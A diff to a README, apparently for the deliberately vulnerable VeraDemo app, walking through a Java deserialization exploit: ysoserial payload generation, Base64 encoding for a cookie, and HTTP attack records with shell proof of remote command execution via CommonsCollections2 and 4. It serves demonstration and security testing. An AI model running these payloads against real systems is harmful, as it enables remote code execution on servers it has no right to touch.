@@ -122,7 +122,11 @@ Starting container verademo... To use the app, browse to http://127.0.0.1:4080/v
 
 # Deserialization Exploit with Ysoserial
 
+The below shows how the issue found in [Veracode Pipeline Scan](veracode-pipeline-scan-results.json#L563) could be exploited.
+
 ## Generate different payloads
+
+First we use ysoserial to generate attack Remote Command Execution (RCE) payloads that'll attempt to simply execute `touch /tmp/PAYLOAD_NAME` on the target:
 
 ```bash
 $ cat gen-payloads.sh
@@ -135,10 +139,12 @@ for payload in $PAYLOAD_LIST;do
     java -jar ysoserial.jar $payload "$command"> "$filename"
 
 
+# Show the payloads for Commons Collections (often reliable)
 $ ls CommonsCollections*.bin
 CommonsCollections1.bin CommonsCollections3.bin CommonsCollections5.bin
 CommonsCollections2.bin CommonsCollections4.bin CommonsCollections6.bin
 
+# Encode them in Base64 because the vulnerable code deserializes the cookie value from Base64
 $ for i in CommonsCollections*; do cat $i | base64 > $i.b64; done
 
 $ ls CommonsCollections*.b64
@@ -147,6 +153,10 @@ CommonsCollections2.bin.b64 CommonsCollections4.bin.b64 CommonsCollections6.bin.
 ```
 
 ## Successful exploitation with CommonsCollections2
+
+After a few attempt, we determined that the CommonsCollections2 payload was successful for RCE (va "rO0..." injected in the cookie).
+
+Here's an example attack (don't worry about HTTP 500):
 
 ```http
 =======http://verademo.me:4080/verademo/login?target=profile======
@@ -306,11 +316,14 @@ Content-Length: 11757
 </pre></p><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/7.0.107</h3></body></html>
 ===
 
+# On the target, we can see that the execution of "mkdir /tmp/CommonsCollections2" was successful:
 root@8174f335c3a6:/tmp# ls
 CommonsCollections2  hsperfdata_root
 ```
 
 ## Successful exploitation with CommonsCollections4
+
+After a few attempt, we determined that the CommonsCollections4 payload was also successful for RCE (va "rO0..." injected in the cookie):
 
 ```http
 =======http://verademo.me:4080/verademo/login?target=profile======
@@ -477,6 +490,7 @@ Content-Length: 12356
 </pre></p><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/7.0.107</h3></body></html>
 ===
 
+# On the target, we can see that the execution of "mkdir /tmp/CommonsCollections4" was successful:
 root@8174f335c3a6:/tmp# ls
 CommonsCollections2  CommonsCollections4  hsperfdata_root
 ```
